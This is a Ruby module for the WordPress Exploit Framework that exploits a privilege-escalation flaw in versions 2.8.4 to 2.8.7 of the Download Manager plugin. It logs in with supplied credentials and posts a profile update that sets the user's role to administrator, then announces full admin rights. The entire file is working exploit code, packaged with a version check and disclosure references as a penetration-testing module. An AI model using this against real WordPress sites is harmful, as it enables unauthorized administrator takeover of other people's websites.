class Wpxf::Auxiliary::DownloadManagerAuthenticatedPrivilegeEscalation < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'Download Manager Authenticated Privilege Escalation',
      desc: 'The Download Manager plugin, in versions 2.8.4 to 2.8.7, '\
            'allows authenticated users to escalate their user role to '\
            'that of an administrator.',
      author: [
        'James Golovich',                  # Disclosure
        'Rob Carr <rob[at]rastating.com>'  # WPXF module
      ],
      references: [
        ['WPVDB', '8365'],
        ['URL', 'http://www.pritect.net/blog/wordpress-download-manager-2-8-8-critical-security-vulnerabilities']
      ],
      date: 'Jan 19 2016'
    )

    register_options([
      Wpxf::Options::StringOption.new(
        name: 'username',
        desc: 'The username to authenticate with',
        default: Utility::Text.rand_alpha(10)
      ),
      Wpxf::Options::StringOption.new(
        name: 'password',
        desc: 'The password to authenticate with',
        default: Utility::Text.rand_alpha(rand(10..20))
      )
    ])
  end

  def username
    normalized_option_value('username')
  end

  def password
    normalized_option_value('password')
  end

  def check
    check_plugin_version_from_readme('download-manager', '2.8.8', '2.8.4')
  end

  def run
    return false unless super

    cookie = authenticate_with_wordpress(username, password)
    return false unless cookie

    body = {
      'wpdm_profile' => {
        'display_name' => username,
        'role' => 'administrator'
      },
      'pfile_data' => {
        'display_name' => username,
        'role' => 'administrator'
      },
      'password'        => password,
      'cpassword'       => password,
      'payment_account' => '0'
    }

    scoped_option_change('follow_http_redirection', false) do
      res = execute_post_request(
        url: full_uri,
        body: body,
        cookie: cookie
      )

      if res.code == 302
        emit_success "User #{username} now has full admin rights"
      else
        emit_error 'Failed to escalate privileges'
        return false
      end
    end

    return true
  end
end
